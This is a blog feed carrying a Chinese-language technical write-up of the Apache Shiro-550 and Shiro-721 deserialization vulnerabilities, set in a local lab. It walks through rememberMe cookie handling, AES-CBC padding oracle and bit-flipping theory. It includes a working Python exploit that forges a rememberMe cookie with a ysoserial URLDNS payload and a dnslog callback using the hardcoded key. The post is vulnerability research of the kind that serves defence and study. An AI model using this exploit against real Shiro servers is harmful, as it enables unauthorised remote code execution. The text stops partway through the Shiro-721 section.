<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0range的小窝</title>
  
  <subtitle>Trust the process.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://0range228.github.io/"/>
  <updated>2021-10-18T15:07:14.236Z</updated>
  <id>https://0range228.github.io/</id>
  
  <author>
    <name>0range</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Shiro反序列化漏洞分析</title>
    <link href="https://0range228.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0range228.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-09-09T11:28:28.000Z</published>
    <updated>2021-10-18T15:07:14.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>浮云游子意，落日故人情。</p></blockquote><p>填Shiro的坑。</p><a id="more"></a><h1 id="Apache-Shiro-简介"><a href="#Apache-Shiro-简介" class="headerlink" title="Apache Shiro 简介"></a>Apache Shiro 简介</h1><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。Shiro的优势在于轻量级，使用简单、上手更快、学习成本低。</p><h1 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h1><p>特征：返回包中包含rememberMe=deleteMe字段。</p><p>影响版本：shiro&lt;1.2.24</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure><p>打开samples/web文件，这个是带jsp界面的，待会儿审计的类存放在pom依赖中，maven会帮助我们去找的</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018162539922.png" alt="image-20211018162539922"></p><p>修改一下pom.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有时候IDEA会自动识别facets，没有的话自己去找web.xml手动配一下，</p><p>首先为项目生成artifacts，最后不要忘记配置artifact：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909194117777.png" alt="image-20210909194117777"></p><p>成功：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909194253598.png" alt="image-20210909194253598"></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">官方提示</a>在<code>CookieRememberMeManager</code>类中</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910135738607.png" alt="image-20210910135738607"></p><p>可以看出一对对称函数：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910134817070.png" alt="image-20210910134817070"></p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>把断点下在<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>，debug模式启动tomcat容器，<code>root-secret</code> ，勾选<code>Remember Me</code>选项，来到：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909194933883.png" alt="image-20210909194933883"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195047274.png" alt="image-20210909195047274"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195201209.png" alt="image-20210909195201209"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195303738.png" alt="image-20210909195303738"></p><p>来到这里，我们跟进<code>entrypt</code>方法：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195446227.png" alt="image-20210909195446227"></p><p>cipherService具体如下：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195621660.png" alt="image-20210909195621660"></p><p><code>getEncryptionCipherKey</code>具体是干嘛的呢：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195759875.png" alt="image-20210909195759875"></p><p>返回硬编码的key：<code>kPH+bIxk5D2deZiIxcaaaA==</code></p><p>继续跟，直到结束前面所有的操作；</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909195948967.png" alt="image-20210909195948967"></p><p>进入<code>rememberSerializedIdentity</code>函数：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909200116535.png" alt="image-20210909200116535"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909202655028.png" alt="image-20210909202655028"></p><p>总结流程：</p><ol><li>用户名序列化</li><li>AES-CBC加密，key已知为<code>kPH+bIxk5D2deZiIxcaaaA==</code></li><li>Base64编码</li><li>将上述设置到cookie中的rememberme字段</li></ol><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>断点打到<code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code>：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909201145351.png" alt="image-20210909201145351"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909201335495.png" alt="image-20210909201335495"></p><p>两个重点：</p><p>1- 跟进<code>getRememberedPrincipals</code>函数：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909201721909.png" alt="image-20210909201721909"></p><p>base64为rememberMe字段的value，需要先进行base64解码</p><p>2- 跟进<code>convertBytesToPrincipals</code>函数</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223451788.png" alt="image-20210909223451788"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223605212.png" alt="image-20210909223605212"></p><p>可以看到先AES解密，再反序列化</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223655061.png" alt="image-20210909223655061"></p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223726963.png" alt="image-20210909223726963"></p><p>解密过程总结：</p><ol><li>读取cookie中的rememberMe字段的值</li><li>Base64解码</li><li>AES解密 Key已知</li><li>反序列化得到用户名</li></ol><h3 id="调试小记"><a href="#调试小记" class="headerlink" title="调试小记"></a>调试小记</h3><p>火狐+burpsuite</p><ol><li>启动tomcat</li></ol><p>第一次登陆注册，钩上rememberMe，之后正常登陆，抓包留存：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909230030693.png" alt></p><ol start="2"><li>在解密这里下断点，在登录状态下，删除JSESSIONID字段，发送第一步保存的数据包，</li></ol><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909230120134.png" alt="image-20210909230120134"></p><ol start="3"><li>触发断点，可以继续跟解密步骤了</li></ol><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这里结合URLDNS打一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">"http://127.0.0.1:8081/samples_web_war_exploded/"</span></span><br><span class="line">jar_file = <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">cipher_key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 rememberme的值</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>, jar_file, <span class="string">"URLDNS"</span>, <span class="string">"http://mfn1qr.dnslog.cn"</span>],</span><br><span class="line"> stdout=subprocess.PIPE)</span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</span><br><span class="line">file_body = pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送get请求</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>:base64_ciphertext.decode()&#125;, timeout=<span class="number">10</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">traceback.print_exc()</span><br></pre></td></tr></table></figure><h1 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h1><p>用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段</p><p>影响版本：Apache Shiro &lt; 1.4.2版本</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="AES加密模式"><a href="#AES加密模式" class="headerlink" title="AES加密模式"></a>AES加密模式</h3><ul><li><p>AES是一种对称加密的分组加密算法。</p></li><li><p>分组长度固定为128bit</p></li><li><p>密钥长度可变，128bit、192bit、256bit</p></li><li><p>AES应密钥长度可以称为AES-128，AES-192，AES-256</p></li></ul><table><thead><tr><th>AES加密标准</th><th>密钥长度</th><th>分组长度</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>128 bits ( 4 Bytes × 32 bits/Bytes )</td><td>128 bits</td><td>10</td></tr><tr><td>AES-192</td><td>192 bits ( 6 Bytes × 32 bits/Bytes )</td><td>128 bits</td><td>12</td></tr><tr><td>AES-256</td><td>256 bits ( 8 Bytes × 32 bits/Bytes )</td><td>128 bits</td><td>14</td></tr></tbody></table><h3 id="分组模式"><a href="#分组模式" class="headerlink" title="分组模式"></a>分组模式</h3><p>分组加密有 5 种可选方式：</p><ul><li><strong><code>ECS</code> ( Electronic Codebook Book , 电话本模式 )</strong></li><li><strong><code>CBC</code> ( Cipher Block Chaining , 密码分组链接模式 )</strong></li><li><strong><code>CTR</code> ( Counter , 计算器模式 )</strong></li><li><strong><code>CFB</code> ( Cipher FeedBack , 密码反馈模式 )</strong></li><li><strong><code>OFB</code> ( Output FeedBack , 输出反馈模式 )</strong></li></ul><h3 id="CBC-模式"><a href="#CBC-模式" class="headerlink" title="CBC 模式"></a>CBC 模式</h3><p>CBC模式作为分组加密的一种，加解密方法如图：</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018110917843.png" alt="image-20211018110917843" style="zoom:50%;"><p>加密过程中，</p><p>IV(Initialization Vector)表示起始向量，通常是随机生成的，长度同分组大小相同，同明文一起传输。</p><p>padding：表示填充位，凑成长度为分组的整数倍</p><p>第一个明文块首先会和IV进行异或操作，再执行AES加密，得到第一密文块。</p><p>之后，每个明文块会与前一个密文块进行异或，再进行加密。</p><p>最终的密文长度就是图中所有ciphertext块的拼接长度</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018110517102.png" alt="image-20211018110517102" style="zoom:50%;"><p>解密过程中，</p><p>首先密文按照分组长度进行分组，</p><p>第一个密文块直接进行AES解密，得到middletext，该结果再与IV进行异或，得到第一明文块</p><p>之后每一个AES的解密出来的middletext都会和前一个密文块进行异或，得到对应的明文块。</p><p>明文块再拼接到一起就是解密出来的明文</p><h3 id="Padding-填充模式"><a href="#Padding-填充模式" class="headerlink" title="Padding 填充模式"></a>Padding 填充模式</h3><p>Padding是在加密过程中，在最后一个分组的结尾进行填充，用于补齐。</p><p>CBC模式下的三种Padding方式：</p><ul><li>NoPadding : 明文长度必须是 8 Bytes 的倍数。</li><li>PKCS5Padding : 以完整字节填充 , 每个填充字节的值是用于填充的字节数 。即要填充 N 个字节 , 每个字节都为 N。</li><li>ISO10126Padding : 以随机字节填充 , 最后一个字节为填充字节的个数 。</li></ul><p>Shiro用的是PKCS5Padding：</p><p>所以正确的padding byte值只可能为：</p><ul><li><p>1个字节的padding为0x01</p></li><li><p>2个字节的padding为0x02,0x02</p></li><li><p>3个字节的padding为0x03,0x03,0x03</p></li><li><p>4个字节的padding为0x04,0x04,0x04,0x04</p></li></ul><p>…</p><h3 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h3><p>Padding Oracle Attack 是一种针对CBC模式分组加密算法的攻击。</p><p>是的，<strong>如果解密时候的iv被控制，那么攻击者就可以进行Padding Oracle Attack</strong>。</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018141105917.png" alt="image-20211018141105917" style="zoom:50%;"><p>middle指的是最后一个分组的密文结果</p><p>爆破思路：</p><p><strong>大前提：对于ASE解密时padding的正确与否，目标会返回一个明确的信息。</strong></p><p>middle永远是保持不变的，iv是在变的。</p><p>尝试让plain的最后一个字节为0x01，可以得到middle最后一个字节内容0xaa</p><p>之后plain的最后两个字节为0x0202，0x030303，0x040404…</p><p>因此，通过Padding Oracle Attack可以在不知道密钥(key)的情况下，获取全部明文的值。</p><p>并且，在获得middle之后，可以通过改变IV，使<strong>密文解密为任意明文</strong></p><p>参考<a href="https://f1sh.site/2017/08/04/%E5%88%9D%E5%AD%A6padding-oracle-attack/" target="_blank" rel="noopener">f1sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原明文^原IV = middle</span><br><span class="line">新明文^新IV = middle</span><br><span class="line">原明文^原IV^新明文 = 新IV</span><br></pre></td></tr></table></figure><p>只要将旧IV改成新IV，密文解密为任意明文；</p><h3 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h3><p>一句话，通过修改密文进而篡改明文</p><p>第N组明文=N组密文的解密结果 XOR  第N-1组密文</p><p>公式表达</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Plaintext[0] = Decrypt(Cipher[0]) XOR IV (N=0)</span><br><span class="line">Plaintext[N] = Decrypt(Cipher[N]) XOR Cipher[N-1] (N&gt;=1)</span><br></pre></td></tr></table></figure><p>N&gt;=1下我们假设：</p><p>M = Decrypt(Cipher[N])</p><p>C = Cipher[N-1]</p><p>P = Plaintext[N]</p><p>根据异或特性有，两个数相同为0，不同为1：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M XOR C = P</span><br><span class="line">M XOR C XOR P = 0</span><br></pre></td></tr></table></figure><p>如果我们希望修改明文P[x]为P ，我们可以修改C[x]</p><p>证明：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = P[x]</span><br><span class="line">c = C[x]</span><br><span class="line">m = M[x]</span><br><span class="line"></span><br><span class="line">m XOR c = p</span><br><span class="line">p XOR x = P</span><br><span class="line"></span><br><span class="line">令 c' = c XOR p XOR P</span><br><span class="line">m XOR c' = m XOR c XOR p XOR P = p XOR p XOR P = P</span><br><span class="line">成功</span><br></pre></td></tr></table></figure><p>举个例子:</p><p>cipher = “0123456789,helloworld,java”</p><p>将通过CBC攻击密文篡改明文为”0123456789,helloworld,javA”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex,a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(iv,plaintext)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(plaintext)%<span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"plaintext length is invalid"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> len(iv) != <span class="number">16</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"IV length is invalid"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">key=<span class="string">"1234abcd1234abcd"</span></span><br><span class="line">aes_encrypt = AES.new(key,AES.MODE_CBC,IV=iv)</span><br><span class="line"><span class="keyword">return</span> b2a_hex(aes_encrypt.encrypt(plaintext))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(iv,cipher)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(iv) != <span class="number">16</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"IV length is invalid"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">key=<span class="string">"1234abcd1234abcd"</span></span><br><span class="line">aes_decrypt = AES.new(key,AES.MODE_CBC,IV=iv)</span><br><span class="line"><span class="keyword">return</span> b2a_hex(aes_decrypt.decrypt(a2b_hex(cipher)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">iv=<span class="string">"ABCDEFGH12345678"</span></span><br><span class="line">plaintext=<span class="string">"0123456789ABCDEFGHhelloworldjava"</span></span><br><span class="line"><span class="comment">#plaintext="0123456789ABCDEFhellocbcflipping"</span></span><br><span class="line">cipher=encrypt(iv, plaintext)</span><br><span class="line"><span class="keyword">print</span> (cipher)</span><br><span class="line">de_cipher = decrypt(iv, cipher)</span><br><span class="line"><span class="keyword">print</span> (de_cipher)</span><br><span class="line"><span class="keyword">print</span> (a2b_hex(de_cipher))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改java-&gt;javA 但是第一个分组乱码</span></span><br><span class="line">bin_cipher = bytearray(a2b_hex(cipher))</span><br><span class="line">bin_cipher[<span class="number">15</span>] = bin_cipher[<span class="number">15</span>] ^ ord(<span class="string">'a'</span>) ^ ord(<span class="string">'A'</span>)</span><br><span class="line">de_cipher = decrypt(iv,b2a_hex(bin_cipher))</span><br><span class="line"><span class="keyword">print</span> (de_cipher)</span><br><span class="line"><span class="keyword">print</span> (a2b_hex(de_cipher))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改IV 不让第一个分组乱码</span></span><br><span class="line">bin_decipher = bytearray(a2b_hex(de_cipher))</span><br><span class="line">bin_iv = bytearray(iv.encode())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(iv)):</span><br><span class="line">bin_iv[i] = bin_iv[i] ^ bin_decipher[i] ^ ord(<span class="string">'X'</span>)</span><br><span class="line">print(bin_iv)</span><br><span class="line">de_cipher = decrypt(bytes(bin_iv),b2a_hex(bin_cipher))</span><br><span class="line"><span class="keyword">print</span> (de_cipher)</span><br><span class="line"><span class="keyword">print</span> (a2b_hex(de_cipher))</span><br><span class="line"></span><br><span class="line">test()</span><br></pre></td></tr></table></figure><h2 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h2><p>和550一样，debug启动起来，把断点下到org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals的convertBytesToPrincipals处，持续跟进：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018171112020.png" alt="image-20211018171112020"></p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018173132892.png" alt="image-20211018173132892" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018191828795.png" alt="image-20211018191828795" style="zoom:50%;"><p>接下来进入</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018191909091.png" alt="image-20211018191909091" style="zoom:50%;"><p>做了一系列处理</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193429360.png" alt="image-20211018193429360"></p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193508168.png" alt="image-20211018193508168" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193555759.png" alt="image-20211018193555759" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193614757.png" alt="image-20211018193614757" style="zoom:50%;"><p>进入doFinal函数</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193745018.png" alt="image-20211018193745018" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193721060.png" alt="image-20211018193721060" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193841499.png" alt="image-20211018193841499" style="zoom:50%;"><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018193918762.png" alt="image-20211018193918762"></p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018194008372.png" alt="image-20211018194008372" style="zoom:50%;"><p>调用链：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.crypto.Cipher#doFinal(byte[])</span><br><span class="line">com.sun.crypto.provider.AESCipher#engineDoFinal(byte[], int, int)</span><br><span class="line">com.sun.crypto.provider.CipherCore#doFinal(byte[], int, int)</span><br><span class="line">com.sun.crypto.provider.CipherCore#fillOutputBuffer</span><br><span class="line">com.sun.crypto.provider.CipherCore#unpad</span><br><span class="line">com.sun.crypto.provider.PKCS5Padding#unpad</span><br></pre></td></tr></table></figure><p>可以看到了来到了Shiro选择的PKCS5Padding类unpad函数：</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018194444766.png" alt="image-20211018194444766" style="zoom:50%;"><p>这里如果unpad报错，会爆异常<code>new CryptoException(msg, e);</code></p><p>回到上层可以看到，由<code>onRememberedPrincipalFailure</code>函数来处理</p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018195432687.png" alt="image-20211018195432687" style="zoom:50%;"><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018195807299.png" alt="image-20211018195807299" style="zoom:50%;"><p>只要padding错误，服务端就会返回一个cookie: <strong>rememberMe=deleteMe;</strong></p><h3 id="前提1-攻击者拥有正常用户的rememberMe字段"><a href="#前提1-攻击者拥有正常用户的rememberMe字段" class="headerlink" title="前提1: 攻击者拥有正常用户的rememberMe字段"></a>前提1: 攻击者拥有正常用户的rememberMe字段</h3>]]></content>
    
    <summary type="html">
    
